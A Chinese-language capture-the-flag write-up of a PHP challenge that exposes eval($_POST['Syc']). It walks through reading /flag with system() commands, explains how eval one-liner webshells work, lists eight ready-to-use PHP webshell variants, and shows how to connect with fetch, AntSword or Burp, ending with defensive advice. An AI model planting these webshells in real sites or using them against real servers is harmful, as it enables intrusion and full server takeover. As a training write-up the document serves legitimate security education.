# Web安全 · 一句话木马（eval webshell）WriteUp —「白给的shell」

> 目标：`http://ee4b5a566ba3b058c0e2c5f5.http-ctf2.dasctf.com/`
> 环境：PHP 5.5.9（Ubuntu），openresty 前端
> 考点：`eval()` 型一句话木马原理与利用
> flag：`CTF2{3bcbd9ef-a038-4ddd-9558-b3bcdd73069d}`

---

## 一、页面信息

访问首页，页面直接写着：

```html
<h1>我家菜刀丢了，你能帮我找一下么</h1>
<p>eval($_POST["Syc"]);</p>
```

"菜刀"指**中国菜刀**（China Chopper）——国内早期最流行的 webshell 管理客户端。这题的题干直接把 `eval($_POST["Syc"]);` 摆出来，等于**白送一个 webshell**（标题"白给的shell"）。

---

## 二、源码确认

用这个 shell 自己读 `index.php`（`POST: Syc=system("cat index.php");`）：

```php
<?php
eval($_POST["Syc"]);
?>
```

**一行，完完整整的一句话木马。** 没有过滤、没有鉴权、没有长度限制。

---

## 三、利用过程

既然服务端会 `eval($_POST["Syc"])`，那么 POST 的 `Syc` 参数内容会被当成 **PHP 代码直接执行**。

```bash
# 1. 确认执行权限
POST Syc=system("id");
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 2. 看目录
POST Syc=system("ls -la");
→ index.php       （当前目录没有 flag）

# 3. 看根目录
POST Syc=system("ls -la /");
→ -rw-r--r-- 1 root root 43 Oct 5 07:40 flag     ← 找到了

# 4. 读 flag
POST Syc=system("cat /flag");
→ CTF2{3bcbd9ef-a038-4ddd-9558-b3bcdd73069d}
```

**注意 `flag` 在 `/` 根目录、权限 `-rw-r--r--`（所有人可读）**，所以 `www-data` 直接就能读，不需要提权。

---

## 四、`eval()` 一句话木马原理

### 1. `eval` 和 `system` 是两个层次的东西

| 函数 | 执行的东西 | 语言层 |
|---|---|---|
| `system()` / `exec()` / `shell_exec()` | **操作系统命令**（ls、cat） | shell |
| `eval()` | **PHP 代码**（`phpinfo();`） | PHP |

`eval($_POST["Syc"])` 把用户输入当 **PHP 代码**执行。所以传 `system("id");` 时，实际执行链是：

```
POST Syc=system("id");
   ↓
eval('system("id");')        ← PHP 代码层
   ↓
system("id") 被执行
   ↓
调用 shell 执行 id 命令       ← 系统命令层
```

也就是说：**eval 是入口，再用 `system()`/`shell_exec()` 打通到系统命令层**。只传 `system("id");` 这一串，就完成了"PHP 代码 → 系统命令"的穿透，这也是"一句话木马"得名的原因——**一个 eval 就够控制整台服务器**。

### 2. 为什么用 `$_POST` 而不是 `$_GET`

`eval($_GET["Syc"])` 也能用，但 `$_POST` 更适合当木马：
- **不受 URL 长度限制**，能传大段 payload
- payload 不出现在访问日志的 URL 里（隐蔽）
- 能传二进制/复杂内容

### 3. 常见的一句话木马写法（对比记忆）

```php
<?php eval($_POST['a']); ?>                 // eval 系（本题）
<?php assert($_POST['a']); ?>               // assert 系（PHP 7.2 后废弃）
<?php @eval($_POST['a']); ?>                // @ 抑制报错，更隐蔽
<?php $a=$_POST['a']; @eval($a); ?>         // 变量中转
<?php @eval($_REQUEST['a']); ?>             // GET/POST 通吃
<?php system($_POST['a']); ?>               // 直接命令执行，不经过 eval
<?php $_GET['a']($_POST['b']); ?>           // 动态函数：?a=system
<?php preg_replace('/e', $_POST['a'], ''); ?> // /e 修饰符（已废弃）
```

---

## 五、连接方式（"菜刀丢了"怎么找回来）

题干说"菜刀丢了"，意思是**用 webshell 客户端去连**。几种方式：

### ① 浏览器手工发（无需工具，最直观）
**F12 → Network / Console**，或直接构造 POST 请求：

```http
POST /index.php HTTP/1.1
Host: ee4b5a566ba3b058c0e2c5f5.http-ctf2.dasctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: ...

Syc=system("cat /flag");
```

在浏览器里有两种做法：
1. **Console** 里用 `fetch`：
```javascript
fetch('/', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'},
            body:'Syc=' + encodeURIComponent('system("cat /flag");')})
  .then(r=>r.text()).then(t=>console.log(t));
```
2. 页面里自己建一个 form 提交，或装一个插件（如 HackBar）填 POST body。

### ② 蚁剑（AntSword，本机已装）
新建数据 → URL 填目标地址 → **请求体**（或参数名）填 `Syc` → 密码即参数名。
蚁剑会自动注入它自己的 payload（默认也是一段 `eval` 风格代码），把文件管理、虚拟终端、数据库等功能可视化。

### ③ Burp Suite
拦截首页请求 → 改成 POST → body 填 `Syc=...` → 反复用 Repeater 改 payload。

> **原理一句话**：webshell 客户端做的事，本质就是"往这个 POST 参数里塞 PHP 代码，然后把回显解析成图形界面"。因此只要能手工发 POST，就不需要客户端也能打。

---

## 六、知识点沉淀

1. **一句话木马的本质**：把用户可控输入送进 `eval()`/`assert()`/`system()`，即"用户输入 = 可执行代码"。这是代码注入（Code Injection）最直接的形态。
2. **`eval` 是 PHP 代码层，`system` 是系统命令层**；一句话木马用 eval 当入口，再靠 `system()`/`shell_exec()` 穿透到 OS 层。
3. **`$_POST` 优于 `$_GET`**：长度不受限、不进 URL 日志、便于传复杂 payload。
4. **flag 不总在 web 目录**。本题当前目录只有 `index.php`，flag 在 `/flag`（根目录，全局可读）。拿到 RCE 后标准的排查动作是：`ls -la` 当前目录 → `ls -la /` → `find / -name '*flag*' 2>/dev/null`。
5. **防御视角**：
   - 绝对禁止把用户输入传给 `eval`/`assert`/`create_function`/`preg_replace(/e)`
   - 上传目录禁止 PHP 执行（nginx `location ~ \.php$ { deny all; }` 或独立静态目录）
   - 文件内容做特征检测（`eval($_POST`、`assert(` 等），WAF 可拦一句话木马
   - 最小权限运行 web 用户，限制其可读文件范围（本题 `www-data` 能直接读 `/flag` 就是权限配置问题）
6. **CTF 提示语的语义**："白给的shell"= 无需绕过直接给你 RCE；"菜刀丢了"= 提示用 webshell 客户端（菜刀/蚁剑）连接，但手工 POST 同样可行。
